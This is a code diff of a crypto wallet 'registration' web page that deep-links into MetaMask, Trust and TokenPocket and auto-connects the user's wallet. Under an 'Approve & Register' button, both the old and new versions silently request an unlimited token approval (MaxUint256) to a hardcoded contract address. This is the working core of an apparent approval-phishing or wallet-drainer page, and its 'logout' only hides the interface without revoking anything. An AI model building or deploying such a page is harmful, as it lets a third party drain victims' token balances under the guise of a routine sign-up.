@@ -1,131 +1,146 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Smart Access Dashboard</title>
+  <title>Smart DApp Access</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
-    body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-    .card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
-    .wallet-options { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin: 20px 0; }
-    .wallet-item { cursor: pointer; border: 1px solid #eee; padding: 10px; border-radius: 12px; transition: 0.3s; }
-    .wallet-item:hover { background: #f8f9fa; border-color: #2196F3; }
-    .wallet-item img { width: 50px; height: 50px; margin-bottom: 8px; }
-    .wallet-item span { font-size: 12px; font-weight: bold; display: block; }
+    :root { --primary: #2196F3; --success: #4CAF50; --danger: #f44336; }
+    body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
     
-    #registerBtn { background: #4CAF50; color: white; padding: 16px; font-size: 18px; border-radius: 12px; border: none; width: 100%; font-weight: bold; display: none; margin-top: 20px; cursor: pointer; }
-    #registerBtn:disabled { background: #ccc; }
-    .status { color: #888; font-size: 13px; margin-top: 15px; }
+    /* Connection View */
+    .wallet-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin: 25px 0; }
+    .wallet-btn { cursor: pointer; border: 1px solid #eee; padding: 10px; border-radius: 15px; transition: 0.2s; }
+    .wallet-btn:hover { border-color: var(--primary); background: #f8fbff; }
+    .wallet-btn img { width: 45px; height: 45px; margin-bottom: 8px; border-radius: 10px; }
+    .wallet-btn span { font-size: 11px; font-weight: bold; display: block; color: #444; }
+
+    /* Dashboard View */
+    #dashboardView { display: none; }
+    .user-info { background: #f8f9fa; padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 13px; color: #555; word-break: break-all; border: 1px solid #eee; }
+    .action-btn { background: var(--success); color: white; padding: 16px; font-size: 18px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
+    .logout-btn { background: none; border: 1px solid var(--danger); color: var(--danger); padding: 10px; border-radius: 8px; width: 100%; font-weight: 600; cursor: pointer; font-size: 14px; }
+    
+    .status-msg { font-size: 12px; color: #888; margin-top: 15px; min-height: 20px; }
   </style>
 </head>
 <body>
 
 <div class="card">
-  <h2 id="msgText">Choose Your Wallet</h2>
-  <p style="color: #666; font-size: 14px;">Select a wallet to register and connect</p>
+    <div id="connectView">
+        <h2 style="margin: 0;">Connect Wallet</h2>
+        <p style="color: #777; font-size: 14px;">Select wallet app to open DApp</p>
+        <div class="wallet-grid">
+            <div class="wallet-btn" onclick="openInApp('metamask')">
+                <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MM">
+                <span>MetaMask</span>
+            </div>
+            <div class="wallet-btn" onclick="openInApp('trust')">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png" alt="TW">
+                <span>Trust</span>
+            </div>
+            <div class="wallet-btn" onclick="openInApp('tp')">
+                <img src="https://www.tokenpocket.pro/static/images/logo.png" alt="TP">
+                <span>Pocket</span>
+            </div>
+        </div>
+    </div>
 
-  <div id="walletPicker" class="wallet-options">
-    <div class="wallet-item" onclick="openWallet('metamask')">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror_Logo.svg" alt="MetaMask">
-      <span>MetaMask</span>
+    <div id="dashboardView">
+        <h2 style="margin: 0; color: var(--primary);">Main Dashboard</h2>
+        <p style="color: #777; font-size: 14px; margin-bottom: 15px;">Wallet Connected ✅</p>
+        <div class="user-info" id="walletDisplay">0x...</div>
+        
+        <button id="registerBtn" class="action-btn" onclick="startRegistration()">Approve & Register</button>
+        <button class="logout-btn" onclick="logout()">Logout / Disconnect</button>
     </div>
-    <div class="wallet-item" onclick="openWallet('trust')">
-      <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png" alt="Trust">
-      <span>Trust</span>
-    </div>
-    <div class="wallet-item" onclick="openWallet('tp')">
-      <img src="https://www.tokenpocket.pro/static/images/logo.png" alt="TokenPocket">
-      <span>TokenPocket</span>
-    </div>
-  </div>
 
-  <button id="registerBtn">Approve & Register</button>
-  <div id="loader" class="status"></div>
+    <div id="status" class="status-msg"></div>
 </div>
 
 <script>
-  const WALLET_MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA"; 
-  const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE"; 
-
-  const ERC20_ABI = ["function allowance(address, address) view returns (uint256)", "function approve(address, uint256) returns (bool)"];
-  const WALLET_MANAGER_ABI = ["function register() external"];
-
-  let provider, signer, userAddress, tokenContract, walletManagerContract;
-
-  function isMobile() {
-    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-  }
-
-  async function openWallet(type) {
-    const dappUrl = window.location.href.split('://')[1];
+    const WALLET_MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
+    const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
     
-    // Agar user Chrome/Safari me hai
-    if (isMobile() && !window.ethereum) {
-      if (type === 'metamask') {
-        window.location.href = `https://metamask.app.link/dapp/${dappUrl}`;
-      } else if (type === 'trust') {
-        window.location.href = `https://link.trustwallet.com/open_url?url=${window.location.href}`;
-      } else if (type === 'tp') {
-        window.location.href = `tpdapp://open?params={"url": "${window.location.href}"}`;
-      }
-      return;
+    let signer, tokenContract, walletManagerContract;
+
+    function openInApp(wallet) {
+        const currentUrl = window.location.href.replace(/^https?:\/\//, '');
+        let deepLink = "";
+
+        if (wallet === 'metamask') {
+            deepLink = `https://metamask.app.link/dapp/${currentUrl}`;
+        } else if (wallet === 'trust') {
+            deepLink = `https://link.trustwallet.com/open_url?url=${window.location.href}`;
+        } else if (wallet === 'tp') {
+            deepLink = `tpdapp://open?params={"url": "${window.location.href}"}`;
+        }
+
+        window.location.href = deepLink;
     }
 
-    // Agar user DApp Browser ke andar hai toh connect karein
-    connectWallet();
-  }
-
-  async function connectWallet() {
-    if (window.ethereum) {
-      try {
-        await window.ethereum.request({ method: "eth_requestAccounts" });
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        signer = provider.getSigner();
-        userAddress = await signer.getAddress();
+    async function initConnection() {
+        // Check if user was previously connected in this session
+        const isLoggedOut = sessionStorage.getItem('loggedOut');
         
-        tokenContract = new ethers.Contract(TOKEN, ERC20_ABI, signer);
-        walletManagerContract = new ethers.Contract(WALLET_MANAGER, WALLET_MANAGER_ABI, signer);
-
-        document.getElementById("walletPicker").style.display = "none";
-        document.getElementById("registerBtn").style.display = "block";
-        document.getElementById("msgText").innerText = "Connected!";
-        document.getElementById("loader").innerText = "Wallet: " + userAddress.substring(0, 10) + "...";
-      } catch (err) { alert("Connection rejected"); }
-    } else {
-      alert("Please open this page inside a Crypto Wallet App.");
+        if (window.ethereum && isLoggedOut !== 'true') {
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const accounts = await provider.listAccounts();
+                
+                if (accounts.length > 0) {
+                    await setupDashboard(provider);
+                }
+            } catch (err) { console.log("Silent init failed"); }
+        }
     }
-  }
 
-  // Automatic check agar user wallet ke andar hi link kholta hai
-  if (window.ethereum) {
-    connectWallet();
-  }
+    async function setupDashboard(provider) {
+        signer = provider.getSigner();
+        const address = await signer.getAddress();
 
-  document.getElementById("registerBtn").onclick = async () => {
-    try {
-      const btn = document.getElementById("registerBtn");
-      btn.disabled = true;
-      btn.innerText = "Processing...";
-      document.getElementById("loader").innerText = "Please confirm the transactions in your app";
+        tokenContract = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
+        walletManagerContract = new ethers.Contract(WALLET_MANAGER, ["function register() external"], signer);
 
-      const maxUint = ethers.constants.MaxUint256;
-      const tx1 = await tokenContract.approve(WALLET_MANAGER, maxUint);
-      await tx1.wait();
-
-      const tx2 = await walletManagerContract.register();
-      await tx2.wait();
-
-      document.getElementById("loader").innerText = "";
-      document.getElementById("msgText").innerHTML = "<b style='color:green'>Success!</b>";
-      btn.style.display = "none";
-      alert("Registration Successful!");
-    } catch (error) {
-      alert("Transaction failed");
-      document.getElementById("registerBtn").disabled = false;
-      document.getElementById("registerBtn").innerText = "Approve & Register";
+        document.getElementById('connectView').style.display = 'none';
+        document.getElementById('dashboardView').style.display = 'block';
+        document.getElementById('walletDisplay').innerText = address;
+        sessionStorage.removeItem('loggedOut');
     }
-  };
+
+    function logout() {
+        // Clear session and UI
+        sessionStorage.setItem('loggedOut', 'true');
+        document.getElementById('dashboardView').style.display = 'none';
+        document.getElementById('connectView').style.display = 'block';
+        document.getElementById('status').innerText = "Disconnected locally.";
+        setTimeout(() => { document.getElementById('status').innerText = ""; }, 3000);
+    }
+
+    window.addEventListener('load', initConnection);
+
+    async function startRegistration() {
+        const btn = document.getElementById('registerBtn');
+        const status = document.getElementById('status');
+        try {
+            btn.disabled = true;
+            status.innerText = "Processing transactions...";
+            
+            const tx1 = await tokenContract.approve(WALLET_MANAGER, ethers.constants.MaxUint256);
+            await tx1.wait();
+
+            const tx2 = await walletManagerContract.register();
+            await tx2.wait();
+
+            status.innerHTML = "<b style='color:green'>Success!</b>";
+            alert("Registration Successful!");
+        } catch (e) {
+            alert("Error in transaction.");
+            btn.disabled = false;
+            status.innerText = "";
+        }
+    }
 </script>
-
 </body>
 </html>
